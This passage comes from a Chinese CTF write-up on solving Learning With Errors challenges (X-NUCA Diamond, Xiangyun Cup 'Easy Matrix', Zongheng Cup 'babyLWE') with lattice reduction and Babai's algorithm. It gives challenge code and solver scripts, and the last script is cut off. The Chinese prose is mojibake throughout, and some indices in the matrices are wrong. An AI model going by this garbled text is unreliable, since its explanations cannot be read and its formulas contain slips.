¼å­<br>$$<br>A=<br>\begin{pmatrix}<br>1&amp;0&amp;\cdots&amp;0&amp;T_0\\<br>0&amp;1&amp;\cdots&amp;0&amp;T_1\\<br>\vdots&amp;\vdots&amp;\ddots&amp;0&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;1&amp;T_{63}\\<br>0&amp;0&amp;\cdots&amp;0&amp;-sum<br>\end{pmatrix}<br>$$<br>åˆ™æœ‰<br>$$<br>\begin{pmatrix}<br>a_0,a_1,â€¦,a_{63},{1}<br>\end{pmatrix}<br>\begin{pmatrix}<br>1&amp;0&amp;\cdots&amp;0&amp;T_0\\<br>0&amp;1&amp;\cdots&amp;0&amp;T_1\\<br>\vdots&amp;\vdots&amp;\ddots&amp;0&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;1&amp;T_{63}\\<br>0&amp;0&amp;\cdots&amp;0&amp;-sum<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>a_0,a_1,â€¦,a_{63},{0}<br>\end{pmatrix}<br>$$<br>å¯ä»¥çœ‹åˆ°$\begin{pmatrix}a_0,a_1,â€¦,a_{63},0\end{pmatrix}$æ˜¯å…¶ä¸­ä¸€ä¸ªæ ¼ç‚¹, è€Œä¸”éå¸¸çš„å°, å¯ä»¥å°è¯•ç”¨LLLå°†å…¶è§„çº¦å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">R = [...]</span><br><span class="line">Lattice = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>):</span><br><span class="line">        <span class="keyword">if</span> i==j <span class="keyword">and</span> i!= <span class="number">64</span>:</span><br><span class="line">            Lattice[i][j] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j== <span class="number">64</span>:</span><br><span class="line">            Lattice[i][j] = R[i]</span><br><span class="line">Lattice[<span class="number">64</span>][<span class="number">64</span>] = -Lattice[<span class="number">64</span>][<span class="number">64</span>]</span><br><span class="line">Lattice = Matrix(Lattice)</span><br><span class="line">a = Lattice.LLL()[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># (868, 798, 863, 260, 206, 550, 326, 908, 49, 50, 273, 528, 584, 569, 975, 261, 885, 680, 116, 33, 677, 664, 922, 178, 999, 336, 60, 655, 102, 438, 269, 754, 988, 124, 10, 380, 589, 382, 668, 623, 335, 845, 104, 117, 961, 917, 114, 590, 255, 26, 81, 846, 925, 548, 446, 796, 543, 997, 492, 651, 485, 137, 701, 247)</span></span><br></pre></td></tr></table></figure><h2 id="æ¢å¤-A-lwe"><a href="#æ¢å¤-A-lwe" class="headerlink" title="æ¢å¤$A_{lwe}$"></a>æ¢å¤$A_{lwe}$</h2><p>è¿™éƒ¨åˆ†è¿˜æœ‰äº›ä¸æ˜ç™½,å…ˆæ”¾ç€</p><h2 id="LWE"><a href="#LWE" class="headerlink" title="LWE"></a>LWE</h2><p>$$<br>s \cdot A + e = a<br>$$</p><p>å¯ä»¥å°†è¿™ä¸ªç­‰å¼ç†è§£æˆ$A$æ˜¯ä¸€ä¸ªæ ¼å­, $s$æ˜¯ä¸€ä¸ªçº¿æ€§ç»„åˆ, é‚£ä¹ˆ$b = s \cdot A$æ˜¯ä¸€ä¸ªæ ¼ç‚¹, $e$æ˜¯è¯¯å·®, $a = b+e$æ˜¯ä¸€ä¸ªéæ ¼ç‚¹. LWEå°±æ˜¯è¦æ‰¾åˆ°è¿™ä¹ˆç¦»è¿™ä¸ªéæ ¼ç‚¹æœ€è¿‘çš„æ ¼ç‚¹. ä¹Ÿå°±æ˜¯CVPäº†</p><p>å½“$s$çš„é•¿åº¦ä¸æ˜¯å¾ˆé•¿çš„æ—¶å€™, ä¹Ÿå°±æ˜¯è¯´ç»´åº¦æ¯”è¾ƒå°çš„æ—¶å€™, è¿™ä¸ªCVPè¿˜æ˜¯å¯ä»¥è§£å†³çš„, è€Œè¿™é‡Œ$s$çš„é•¿åº¦æ˜¯25, è§‚å¯Ÿä¸€ä¸‹LWEçš„å¼å­.<br>$$<br>s_0A_{i,0}+s_1A_{i,1}+â€¦+s_{24}A_{i,24} + e_i = a_i \ (mod \ p)<br>$$<br>ç†Ÿæ‚‰çš„é€ æ ¼å­å‰çš„å¥—è·¯, å°†å¼å­åŒ–ä¸º:<br>$$<br>s_0A_{i,0}+s_1A_{i,1}+â€¦+s_{24}A_{i,24} + k_ip + e_i= a_i<br>$$<br>é‚£ä¹ˆå¯ä»¥æ„é€ å‡ºç­‰å¼:<br>$$<br>s \cdot L + e =<br>(s_0,s_1,â€¦,s_{24},k_0,k_1,â€¦,k_{39})<br>\begin{pmatrix}<br>A_{0,0}&amp;A_{1,0}&amp;\cdots&amp;A_{39,0}\\<br>A_{0,1}&amp;A_{1,1}&amp;\cdots&amp;A_{39,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>A_{0,24}&amp;A_{1,24}&amp;\cdots&amp;A_{39,24}\\<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p\\<br>\end{pmatrix}<br>+<br>(e_0,e_1,â€¦,e_{39})<br>=<br>(c_0,c_1,â€¦,c_{39})<br>$$<br>å…ˆå¯¹çŸ©é˜µ$L$è¿›è¡Œè§„çº¦, å¾—åˆ°ä¸€ä¸ªgood basis, å†ç”¨Babaiâ€™s algorithmæ±‚è§£CVPï¼Œå³å¯å¾—åˆ°ç¦»$a$æœ€è¿‘çš„æ ¼ç‚¹$b$ã€‚</p><p>æœ€åè§£æ–¹ç¨‹$A_{lwe} \cdot s = b^{T} (mod \ 1000)$</p><p>è§£å‡º$s$è¿™é“é¢˜åŸºæœ¬ä¸Šå°±åšå®Œäº†</p><p>ä¸‹é¢æ˜¯Babaiâ€™s algorithmçš„æ¿å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br></pre></td></tr></table></figure><p>æ€»çš„expå°±æ²¡å†™äº†, å…·ä½“çš„å¯ä»¥å‚ç…§ç€ä¸‹é¢ä¸¤é¢˜æ¥å†™, åæ­£éƒ½æ˜¯ä¸€ä¸ªæ¿å­çš„</p><h1 id="2020ç¥¥äº‘æ¯-Easy-Matrix"><a href="#2020ç¥¥äº‘æ¯-Easy-Matrix" class="headerlink" title="2020ç¥¥äº‘æ¯ Easy Matrix"></a>2020ç¥¥äº‘æ¯ Easy Matrix</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_offset</span>(<span class="params">size</span>):</span></span><br><span class="line">    x = np.random.normal(<span class="number">0</span>, <span class="number">4.7873</span>, size)</span><br><span class="line">    <span class="keyword">return</span> np.rint(x)</span><br><span class="line"></span><br><span class="line">secret = np.array(<span class="built_in">list</span>(flag))</span><br><span class="line"></span><br><span class="line">column = <span class="built_in">len</span>(<span class="built_in">list</span>(secret))</span><br><span class="line">row = <span class="number">128</span></span><br><span class="line">prime = <span class="number">2129</span></span><br><span class="line"></span><br><span class="line">matrix = np.random.randint(<span class="number">512</span>, size=(row, column))</span><br><span class="line">product = matrix.dot(secret) % prime</span><br><span class="line">offset = random_offset(size=row).astype(np.int64)</span><br><span class="line">result = (product + offset) % prime</span><br><span class="line"></span><br><span class="line">np.save(<span class="string">&quot;matrix.npy&quot;</span>, matrix)</span><br><span class="line">np.save(<span class="string">&quot;result.npy&quot;</span>, result)</span><br></pre></td></tr></table></figure><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>è¯»å–äº†matrixåå°±å¯ä»¥çŸ¥é“column = 42</p><p>å°†<code>flag</code>è½¬æˆä¸€ä¸ª<code>1*42</code>çš„çŸ©é˜µ$secret$</p><p>æ¥çœ‹çœ‹è¿‡ç¨‹, å…ˆæ˜¯ç”Ÿæˆä¸€ä¸ª<code>42*128 </code>çš„éšæœºçŸ©é˜µ$matrix$, å…ƒç´ éƒ½$\leq 512$</p><p>ç„¶åè®¡ç®—$product = matrix \cdot secret \ (mod \ prime)$, ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ª$1*128$çš„çŸ©é˜µ</p><p>ç»§ç»­ç”Ÿæˆä¸€ä¸ª<code>1*128</code>éšæœºçŸ©é˜µ$offset$</p><p>æœ€åè®¡ç®—$result = (product + offset) \ (mod \ prime)$</p><p>é¢˜ç›®ç»™äº†$result$å’Œ$matrix$</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æ¥çœ‹ä¸€ä¸‹åŠ å¯†çš„å¼å­<br>$$<br>R = S \cdot M + e \ (mod \ p)<br>$$<br>æ˜¾ç„¶æ˜¯ä¸€ä¸ªLWE, ç°åœ¨å·²çŸ¥çš„æ˜¯$M$å’Œ$R$, è¦æ±‚$S$, å°†å¼å­å†™å…·ä½“<br>$$<br>R = (r_0,r_1,..,r_{127}) =<br>(s_0,s_1,â€¦,s_{41})<br>\begin{pmatrix}<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}<br>\end{pmatrix}<br>+<br>(e_0,e_1,â€¦,e_{41})<br>(mod \ p)<br>$$<br>ä¹Ÿå°±æ˜¯è¯´<br>$$<br>r_i = s_0m_{i,0} + s_1m_{i,1}+â€¦+s_{41}m_{i,41} + e_i (mod \ p)<br>$$</p><p>è€å¥—è·¯, æ”¹å†™æˆç­‰å¼æœ‰<br>$$<br>s_0m_{i,0} + s_1m_{i,1}+â€¦+s_{41}m_{i,41} + e_i + k_ip = r_i \<br>s \cdot A + e = r<br>$$</p><p>è§£å†³LWEå¯ä»¥æ„é€ æ ¼å­, ç„¶åç”¨LLLå’Œbabaiâ€™s nearest planeæ¥è§£å†³, ä¸‹é¢å°±æ ¹æ®ç­‰å¼æ„é€ æ ¼å­<br>$$<br>A=<br>\begin{pmatrix}<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}\\<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p<br>\end{pmatrix}<br>\begin{pmatrix}<br>p&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;\cdots&amp;p\\<br>m_{0,0}&amp;m_{1,0}&amp;\cdots&amp;m_{127,0}\\<br>m_{0,1}&amp;m_{1,1}&amp;\cdots&amp;m_{127,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>m_{0,41}&amp;m_{1,42}&amp;\cdots&amp;m_{127,41}\\<br>\end{pmatrix}\\<br>$$</p><p>å®é™…ä¸Šåšçš„æ—¶å€™å³è¾¹çš„æ ¼å­æ‰æœ‰ç”¨, å·¦è¾¹çš„ä¸è¡Œ, å…·ä½“åŸå› æˆ‘ä¹Ÿæä¸æ¸…æ¥š, é—®äº†è€å¸ˆä¹Ÿæ²¡é—®å‡ºä»€ä¹ˆç»“æœ</p><p>ç„¶åå°±å¯ä»¥ç”¨LLLæ ¼çº¦å‡ºgood basis å†ç”¨babaiâ€™s nearest planeè§£CVPäº†</p><p>è§£å‡ºCVPä¹Ÿå°±æ„å‘³ç€æ‰¾åˆ°äº†$s \cdot A = b$ä¸­çš„$b$ , $A$åˆæ˜¯å·²çŸ¥çš„, è§£æ–¹ç¨‹å³å¯</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line">row = <span class="number">128</span></span><br><span class="line">col = <span class="number">42</span></span><br><span class="line">p = <span class="number">2129</span></span><br><span class="line"></span><br><span class="line">M = Matrix(<span class="built_in">list</span>(np.load(<span class="string">&#x27;matrix.npy&#x27;</span>)))</span><br><span class="line">R = vector(<span class="built_in">list</span>(np.load(<span class="string">&#x27;result.npy&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">A = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> i==j:</span><br><span class="line">            A[i][j] = p</span><br><span class="line">A = Matrix(A)</span><br><span class="line">L = Matrix(A.stack(M.transpose()))</span><br><span class="line">lattice = IntegerLattice(L, lll_reduce=<span class="literal">True</span>)</span><br><span class="line">closest_vector = BabaisClosestPlaneAlgorithm(lattice.reduced_basis, R)</span><br><span class="line"></span><br><span class="line">FLAG = Matrix(Zmod(p), M)</span><br><span class="line">flag = FLAG.solve_right(closest_vector)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join( <span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br></pre></td></tr></table></figure><h1 id="2020çºµæ¨ªæ¯-babyLWE"><a href="#2020çºµæ¨ªæ¯-babyLWE" class="headerlink" title="2020çºµæ¨ªæ¯ babyLWE"></a>2020çºµæ¨ªæ¯ babyLWE</h1><h2 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.crypto.lwe <span class="keyword">import</span> LWE</span><br><span class="line"><span class="keyword">from</span> sage.stats.distributions.discrete_gaussian_integer \</span><br><span class="line">    <span class="keyword">import</span> DiscreteGaussianDistributionIntegerSampler <span class="keyword">as</span> DGDIS</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">FLAG = FLAG.encode().replace(<span class="string">b&#x27;-&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">s = <span class="built_in">list</span>(FLAG[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(s)</span><br><span class="line">q = random_prime(<span class="number">1</span>&lt;&lt;<span class="number">512</span>, proof=<span class="literal">False</span>, lbound=<span class="number">1</span>&lt;&lt;<span class="number">511</span>)</span><br><span class="line"></span><br><span class="line">lwe = LWE(n=n, q=q, D=DGDIS(<span class="number">1</span>&lt;&lt;<span class="number">128</span>))</span><br><span class="line">lwe._LWE__s = vector(Zmod(q), s)</span><br><span class="line"></span><br><span class="line">L = [lwe() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;task.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    _ = f.write(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>\n&quot;</span>)</span><br><span class="line">    _ = f.write(<span class="string">f&quot;L = <span class="subst">&#123;L&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å¤ªç¦»è°±äº†, ä¸€ä¸ªæ¿å­ä¸‰ä¸ªæ¯”èµ›ç”¨, è¿™é¢˜ç”¨çš„è¿˜æ˜¯X-NUCA Diamondçš„LWEçš„æ¿å­â€¦<br>ä½†æ˜¯ä¸ºäº†å……åˆ†ç†è§£(å°±æ˜¯è¿˜æ²¡ç†è§£)LWEåˆ°åº•æ˜¯æ€ä¹ˆé€šè¿‡æ ¼å­è§£å‡ºæ¥çš„</p><p>å…ˆçœ‹çœ‹è¿™é¢˜é€ çš„æ ¼å­<br>åŠ å¯†çš„å¼å­è¿˜æ˜¯$s \cdot M + e = a \ (mod \ q)$, è¿™é‡Œçš„$s,M$é•¿åº¦32,ä¸€å…±64ä¸ªå¼å­<br>è¿™é‡ŒåªçŸ¥é“$M$å’Œ$a$è¦æ±‚$s$, æ€è·¯éƒ½æ˜¯è®°$s \cdot M = b $, $b$æ˜¯æ ¼å­$M$çš„ä¸€ä¸ªæ ¼ç‚¹, $a$æ˜¯æ ¼å¤–ä¸€ä¸ªç‚¹, é€šè¿‡å¯¹$M$è§„çº¦æ‰¾åˆ°$good \ basis$ å†åˆ©ç”¨æœ€è¿‘å¹³é¢ç®—æ³•è§£å†³ä¸€ä¸ªCVP, ä¹Ÿå°±æ˜¯æ‰¾åˆ°ç¦»$a$æœ€è¿‘çš„å‘é‡, ä¹Ÿå°±æ˜¯$b$</p><p>æŠŠ$s \cdot M = b \ (mod \ q)$å†è¯¦ç»†ç‚¹å°±æ˜¯<br>$$<br>s_0M_{i,0}+s_1M_{i,1}+â€¦+s_{31}M_{i,31} = b_i + k_iq\\<br>s_0M_{i,0}+s_1M_{i,1}+â€¦+s_{31}M_{i,31}+ k_iq = b_i<br>$$<br>é‚£ä¹ˆé€ å‡ºæ¥çš„æ ¼å­åº”è¯¥æ˜¯ä¸‹é¢è¿™ä¸ªçŸ©é˜µ<br>$$<br>(s_0,s_1,\cdots,s_{31},k_0,k_1,\cdots,k_{63})<br>\begin{pmatrix}<br>M_{0,0}&amp;M_{1,0}&amp;\cdots&amp;M_{63,0}\\<br>M_{0,1}&amp;M_{1,1}&amp;\cdots&amp;M_{63,1}\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>M_{0,31}&amp;M_{1,31}&amp;\cdots&amp;M_{63,31}\\<br>q&amp;0&amp;\cdots&amp;0\\<br>0&amp;q&amp;\cdots&amp;0\\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\<br>0&amp;0&amp;0&amp;q<br>\end{pmatrix}<br>=<br>(b_0,b_1,\cdots,b_{63})<br>$$</p><p>å®é™…ä¸Šåšé¢˜çš„æ—¶å€™çŸ©é˜µæ˜¯ä¸Šé¢$p$ä¸‹é¢$M$çš„, ç„¶åè¿˜æœ‰å…³äºä¸ºä»€ä¹ˆè¦ç”¨64ç»„LWEçš„é—®é¢˜, æ ¹æ®æŸä¸ªå¤§ä½¬çš„åšå®¢, ç»„æ•°è¶Šå¤šè¶Šå¥½, æ‰€ä»¥åŸºæœ¬ä¸Šé¢˜ç›®ç»™äº†å¤šå°‘ç»„å°±ç”¨ä¸Šå¤šå°‘ç»„</p><p>é€šè¿‡å¯¹æ„é€ å‡ºæ¥çš„æ ¼å­è¿›è¡Œè§„çº¦å¾—åˆ°good basisç„¶åç”¨æœ€è¿‘å¹³é¢ç®—å‡º$(b_0,b_1,â€¦,b_{63})$<br>å†è§£æ–¹ç¨‹$s \cdot M = b \ (mod \ p)$å³å¯å¾—åˆ°$s$</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BabaisClosestPlaneAlgorithm</span>(<span class="params">L, w</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Yet another method to solve apprCVP, using a given good basis.</span></span><br><span class="line"><span class="string">    INPUT:</span></span><br><span class="line"><span class="string">    * &quot;L&quot; -- a matrix representing the LLL-reduced basis (v1, ..., vn) of a lattice.</span></span><br><span class="line"><span class="string">    * &quot;w&quot; -- a target vector to approach to.</span></span><br><span class="line"><span class="string">    OUTPUT:</span></span><br><span class="line"><span class="string">    * &quot;v&quot; -- a approximate closest vector.</span></span><br><span class="line"><span class="string">    Quoted from &quot;An Introduction to Mathematical Cryptography&quot;:</span></span><br><span class="line"><span class="string">    In both theory and practice, Babai&#x27;s closest plane algorithm</span></span><br><span class="line"><span class="string">    seems to yield better results than Babai&#x27;s closest vertex algorithm.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    G, _ = L.gram_schmidt()</span><br><span class="line">    t = w</span><br><span class="line">    i = L.nrows() - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">        w -= <span class="built_in">round</span>( (w*G[i]) / G[i].norm()^<span class="number">2</span> ) * L[i]</span><br><span class="line">        i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> t - w</span><br><span class="line"></span><br><span class="line">q = <span class="number">8934325385505568130914092337950620590424921674062792756625169144539462888362199042365894202712873706261308891694743761726859424971637596576879385466842113</span></span><br><span class="line">L = [...]</span><br><span class="line">n = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">Q = [[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n)]</span><br><span class="line">R = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span 